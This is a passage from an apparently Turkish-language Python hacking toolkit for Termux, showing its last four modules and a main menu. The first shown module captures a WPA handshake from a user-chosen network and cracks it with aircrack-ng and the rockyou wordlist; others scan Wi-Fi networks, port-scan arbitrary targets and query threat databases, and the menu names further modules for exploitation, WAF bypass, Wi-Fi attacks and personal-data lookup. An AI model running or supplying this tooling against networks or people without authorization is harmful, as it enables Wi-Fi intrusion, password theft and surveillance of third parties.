# 27. WIFIX ENTERPRISE v6.0 (Handshake Yakalama + aircrack)
# ============================================================
def wifix_enterprise():
    banner_yap()
    print(f"\n{YESIL}[+] Wifix Enterprise v6.0 (WPA Handshake Yakalama)")
    if shutil.which("airodump-ng") is None or shutil.which("aircrack-ng") is None:
        print(f"{KIRMIZI}[-] aircrack-ng kurulu değil! Kurulum:")
        print(f"{SARI}    pkg install aircrack-ng root-repo")
        print(f"{SARI}    pkg install tsu")
        bekle(); return
    arayuz = input(f"{SARI}Arayüz (örn: wlan0): ").strip()
    print(f"{MAVI}[!] Monitor moduna geçiriliyor: airmon-ng start {arayuz}")
    subprocess.run(["airmon-ng", "start", arayuz], capture_output=True)
    mon = arayuz + "mon"
    print(f"{YESIL}[*] Ağ taraması 15 sn yapılıyor...")
    subprocess.run(["timeout", "15", "airodump-ng", mon], capture_output=True)
    print(f"{SARI}[*] Yukarıdaki çıktıdan hedef BSSID ve kanalı not edin.")
    bssid = input(f"{SARI}Hedef BSSID: ").strip()
    kanal = input(f"{SARI}Kanal: ").strip()
    print(f"{YESIL}[*] Handshake dinleniyor (60 sn) - bir istemcinin bağlanmasını bekleyin...")
    try:
        subprocess.run(["timeout", "60", "airodump-ng", "-c", kanal,
                        "--bssid", bssid, "-w", "/sdcard/markos_hs", mon],
                       timeout=75)
        print(f"{SARI}[*] Handshake yakalandıysa kırma denemesi başlatılıyor...")
        subprocess.run(["aircrack-ng", "-w",
                        os.path.expanduser("~/markos_wordlist.txt")
                        if os.path.exists(os.path.expanduser("~/markos_wordlist.txt"))
                        else "/usr/share/wordlists/rockyou.txt",
                        "/sdcard/markos_hs-01.cap"], timeout=120)
    except FileNotFoundError:
        print(f"{KIRMIZI}[-] timeout komutu yok: pkg install coreutils")
    except Exception as e:
        print(f"{KIRMIZI}[-] Hata: {e} (root/tsu gerekli olabilir)")
    log_kaydet("Wifix Enterprise", bssid, {"kanal": kanal})
    bekle()

# ============================================================
# 28. WIFIX AĞ CANAVARI v7.0 (Wi-Fi Denetim Paneli)
# ============================================================
def wifix_canavar():
    banner_yap()
    print(f"\n{YESIL}[+] Wifix Ağ Canavarı v7.0 (Wi-Fi Denetim Paneli)")
    try:
        cikti = subprocess.run(["iw", "dev"], capture_output=True, text=True,
                               timeout=8).stdout
        arayuzler = re.findall(r"Interface\s+(\S+)", cikti)
        if not arayuzler:
            print(f"{KIRMIZI}[-] Arayüz yok. Wi-Fi açık mı?"); bekle(); return
        arayuz = arayuzler[0]
        print(f"{YESIL}[*] Arayüz: {arayuz}")
        durum = subprocess.run(["iw", arayuz, "link"], capture_output=True,
                               text=True, timeout=8).stdout
        print(f"{YESIL}[*] Mevcut bağlantı:\n{durum.strip() or '  (bağlı değil)'}")
        print(f"\n{MAVI}[Ağ Taraması - 20 sn]")
        sonuc = subprocess.run(["iw", arayuz, "scan"], capture_output=True,
                               text=True, timeout=30).stdout
        aglar = re.findall(r"BSS\s+([0-9a-f:]{17}).*?freq:\s+(\d+).*?"
                           r"signal:\s+(-?\d+) dBm.*?SSID:\s+(.*?)\n",
                           sonuc, re.S)
        print(f"{MAVI}{'SSID':<25}{'BSSID':<18}{'KANAL':<6}SİNYAL")
        print(f"{MAVI}{'-'*60}")
        for bssid, freq, sinyal, ssid in sorted(aglar, key=lambda x: int(x[2]), reverse=True)[:15]:
            kanal = str((int(freq) - 2412) // 5 + 1) if int(freq) < 5000 else str((int(freq) - 5180) // 5 + 36)
            seviye = "MÜKEMMEL" if int(sinyal) > -50 else "İYİ" if int(sinyal) > -67 else "ORTA" if int(sinyal) > -80 else "ZAYIF"
            print(f"{YESIL}{ssid.strip()[:24]:<25}{bssid:<18}{kanal:<6}{sinyal} dBm ({seviye})")
    except FileNotFoundError:
        print(f"{KIRMIZI}[-] 'iw' gerekli: pkg install iw")
    except Exception as e:
        print(f"{KIRMIZI}[-] Hata: {e}")
    log_kaydet("Wifix Canavar", "", {})
    bekle()

# ============================================================
# 29. TEHDİT İSTİHBARAT AVI (URLhaus + DNS)
# ============================================================
def tehdit_istihbarat():
    banner_yap()
    print(f"\n{YESIL}[+] Tehdit İstihbarat Avı (URLhaus + Kötü Amaçlı İmza)")
    hedef = input(f"{SARI}URL veya Domain (Örn: example.com/path): ").strip()
    if not hedef.startswith(("http://", "https://")):
        hedef = "https://" + hedef
    print(f"\n{MAVI}[URLhaus (abuse.ch) sorgusu]")
    try:
        r = requests.post("https://urlhaus-api.abuse.ch/v1/url/",
                          data={"url": hedef}, timeout=12)
        veri = r.json()
        if veri.get("query_status") == "no_results":
            print(f"{YESIL}[✓] URLhaus veritabanında KAYIT YOK (temiz görünüyor)")
        elif veri.get("query_status") == "ok":
            print(f"{KIRMIZI}[-] KÖTÜ AMAÇLI OLARAK İŞARETLENDİ!")
            for k in ["url_status", "threat", "blacklists", "tags", "date_added"]:
                if veri.get(k): print(f"{KIRMIZI}    {k}: {veri[k]}")
        else:
            print(f"{SARI}[!] API yanıtı: {veri.get('query_status')}")
    except Exception as e:
        print(f"{SARI}[!] URLhaus sorgusu başarısız: {e}")
    print(f"\n{MAVI}[DNS Karşılaştırma (DoH vs sistem)]")
    try:
        domain = re.sub(r"^https?://", "", hedef).split("/")[0]
        doh = dns_google(domain, "A")
        yerel = socket.gethostbyname(domain)
        print(f"{YESIL}[*] DoH (dns.google): {doh}")
        print(f"{YESIL}[*] Sistem DNS: {yerel}")
        if doh and yerel not in doh:
            print(f"{KIRMIZI}[-] DNS ZEHİRLENMESİ/SAHTELEME ŞÜPHESİ! "
                  f"Sistem çözümü DoH'tan farklı.")
        else:
            print(f"{YESIL}[✓] DNS çözümleri tutarlı")
    except Exception as e:
        print(f"{SARI}[!] DNS kontrolü yapılamadı: {e}")
    print(f"\n{MAVI}[VirusTotal (API anahtarı gerekir - isteğe bağlı)]")
    anahtar = os.environ.get("VT_API_KEY", "")
    if anahtar:
        try:
            r = requests.get(f"https://www.virustotal.com/api/v3/domains/{domain}",
                             headers={"x-apikey": anahtar}, timeout=15)
            v = r.json().get("data", {}).get("attributes", {})
            son = v.get("last_analysis_stats", {})
            print(f"{YESIL}[+] VT: zararlı={son.get('malicious', 0)} şüpheli={son.get('suspicious', 0)} "
                  f"temiz={son.get('harmless', 0)}")
        except Exception as e:
            print(f"{SARI}[!] VT hatası: {e}")
    else:
        print(f"{SARI}[*] VT_API_KEY ortam değişkeni yok - atlandı "
              f"(export VT_API_KEY=... ile aktif edin)")
    log_kaydet("Tehdit İstihbarat", hedef, {})
    bekle()

# ============================================================
# 30. MARKOSAI KARAR RAPORU (Hızlı Denetim + Skor)
# ============================================================
def markosai_rapor():
    banner_yap()
    print(f"\n{YESIL}[+] MarkosAi Karar Raporu (Hızlı Güvenlik Denetimi)")
    hedef = input(f"{SARI}Hedef (IP veya Domain): ").strip()
    try:
        ip = socket.gethostbyname(hedef)
    except socket.gaierror:
        print(f"{KIRMIZI}[-] Geçersiz hedef!"); bekle(); return
    rapor = {"hedef": hedef, "ip": ip, "zaman": time.strftime("%Y-%m-%d %H:%M:%S"),
             "kontroller": {}}
    print(f"\n{YESIL}[*] Denetim başlatıldı: {ip}")
    # 1) Port taraması
    portlar = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993,
               995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080,
               8443, 9200, 11211, 27017]
    acik = port_tara(ip, portlar, timeout=0.5)
    rapor["kontroller"]["acik_portlar"] = sorted(acik)
    kritik = [p for p in acik if p in (23, 139, 445, 3306, 3389, 5900, 6379, 9200, 27017)]
    print(f"{YESIL}[*] Açık port: {len(acik)} | Kritik: {len(kritik)} "
          f"({', '.join(map(str, kritik)) or 'yok'})")
    skor = 100 - len(acik) * 3 - len(kritik) * 5
    # 2) HTTP başlıkları
    try:
        r = http_get("https://" + hedef)
        h = {k.lower(): v for k, v in r.headers.items()}
        eksik = [b for b, _, _ in GUVENLIK_BASLIKLAR if b.lower() not in h]
        rapor["kontroller"]["eksik_guvenlik_basliklari"] = eksik
        skor -= len(eksik) * 2
        print(f"{YESIL}[*] HTTP {r.status_code} | Eksik güvenlik başlığı: {len(eksik)}")
    except Exception:
        print(f"{SARI}[!] HTTPS taraması yapılamadı")
    # 3) TLS
    bilgi = ssl_bilgi(hedef)
    if bilgi:
        rapor["kontroller"]["tls"] = bilgi["versiyon"]
        if bilgi["versiyon"] in ("SSLv3", "TLSv1", "TLSv1.1"):
            skor -= 15
            print(f"{KIRMIZI}[-] Eski TLS: {bilgi['versiyon']}")
        else:
            print(f"{YESIL}[*] TLS: {bilgi['versiyon']}")
    # 4) GeoIP
    geo = ip_api(ip)
    if geo:
        rapor["kontroller"]["konum"] = f"{geo.get('city')}, {geo.get('country')} ({geo.get('isp')})"
    # 5) Karar
    skor = max(0, min(100, skor))
    if skor >= 70:
        karar = "DÜŞÜK RİSK - yüzey küçük, temel kontroller yerinde"
        renk = YESIL
    elif skor >= 40:
        karar = "ORTA RİSK - dikkat çeken açıklar var, derinlemesine test önerilir"
        renk = SARI
    else:
        karar = "YÜKSEK RİSK - kritik servisler açık, acil müdahale gerekli"
        renk = KIRMIZI
    rapor["skor"] = skor
    rapor["karar"] = karar
    print(f"\n{MAVI}{'='*55}")
    print(f"{renk}[!] GÜVENLİK SKORU: {skor}/100")
    print(f"{renk}[!] KARAR: {karar}")
    print(f"{MAVI}{'='*55}")
    dizin = os.path.expanduser("~/markos_raporlar")
    os.makedirs(dizin, exist_ok=True)
    dosya = f"{dizin}/rapor_{hedef.replace('/', '_')}_{int(time.time())}.json"
    with open(dosya, "w", encoding="utf-8") as f:
        json.dump(rapor, f, ensure_ascii=False, indent=2)
    print(f"{YESIL}[+] Rapor kaydedildi: {dosya}")
    log_kaydet("MarkosAi Rapor", hedef, {"skor": skor})
    bekle()

# ============================================================
# ANA MENÜ
# ============================================================
TOOLS = {
    "1": ("Ağ Zafiyet Taraması", ag_zafiyet_tarama),
    "2": ("WAF Algılama Sistemi", waf_algilama),
    "3": ("IMEI Ağ Veri Analizi", imei_analiz),
    "4": ("Telefon Sorgu (OSINT)", telefon_sorgu_osint),
    "5": ("Subdomain Keşif Aracı", subdomain_kesif),
    "6": ("DNS Kayıt Analizi", dns_analiz),
    "7": ("HTTP Güvenlik Başlığı", http_guvenlik),
    "8": ("Dizin & Panel Tarayıcı", dizin_tara),
    "9": ("Mail Sunucu & MX Analizi", mail_analiz),
    "10": ("SSL/TLS Sertifika Analizi", ssl_analiz),
    "11": ("Mark Osint Bilgi Toplama", markosint_bilgi),
    "12": ("MarkOs Term Özel Kabuk", markos_kabuk),
    "13": ("MarkOs Hack Ana İstismar", hack_istismar),
    "14": ("WAF Saldırısı & Bypass", waf_bypass),
    "15": ("Wifix 5.0 Gelişmiş Ağ", wifix_ag),
    "16": ("Instagram Finder", instagram_finder),
    "17": ("IP Yerel Analizör", ip_analiz),
    "18": ("NetDrax Paket Koklayıcı", netdrax_kokla),
    "19": ("Wifi Map Coğrafi", wifi_map),
    "20": ("Wifi Attack Taarruz", wifi_attack),
    "21": ("UserId Konum Bulucu", userid_konum),
    "22": ("Oracle DB Analizörü", oracle_analiz),
    "23": ("Kişisel Veri Doğrulama", kisisel_veri),
    "24": ("Data Forch v2.0", data_forch_v2),
    "25": ("Data Forch v3.0", data_forch_v3),
    "26": ("Data Forch v4.0", data_forch_v4),
    "27": ("Wifix Enterprise v6.0", wifix_enterprise),
    "28": ("Wifix Ağ Canavarı v7.0", wifix_canavar),
    "29": ("Tehdit İstihbarat Avı", tehdit_istihbarat),
    "30": ("MarkosAi Karar Raporu", markosai_rapor),
}

def menu_yap():
    while True:
        banner_yap()
        print(f"{SARI}--- MARKOSINT GÜVENLİK MODÜLLERİ (1-15) ---   --- MARKOS ÖZEL ARAÇLAR (16-30) ---")
        for i in range(1, 16):
            sol_no, sag_no = str(i), str(i + 15)
            sol_metin = f"[{sol_no}] {TOOLS[sol_no][0]}"
            sag_metin = f"[{sag_no}] {TOOLS[sag_no][0]}"
            print(f"{YESIL} {sol_metin:<44} {YESIL}{sag_metin}")
        print(f"{SARI}{'-'*80}")
        print(f"{MAVI} Exit / Güvenli Çıkış")
        print(f"{SARI}{'-'*80}")
        secim = input(f"{YESIL}MarkOs >> Seçiminiz: ").strip()
        if secim in TOOLS:
            try:
                TOOLS[secim][1]()
            except KeyboardInterrupt:
                print(f"\n{SARI}[!] İşlem iptal edildi.")
            except Exception as e:
                print(f"{KIRMIZI}[-] Modül hatası: {e}")
        elif secim in ("0", "00", "exit", "q"):
            print(f"\n{SARI}[!] MarkOs X Termux Sisteminden çıkılıyor. Güvende kalın!")
            sys.exit()
        else:
            print(f"\n{KIRMIZI}[-] Geçersiz seçim! Lütfen 1-30 arasında bir numara girin.")
            time.sleep(1.2)

if __name__ == "__main__":
    menu_yap()
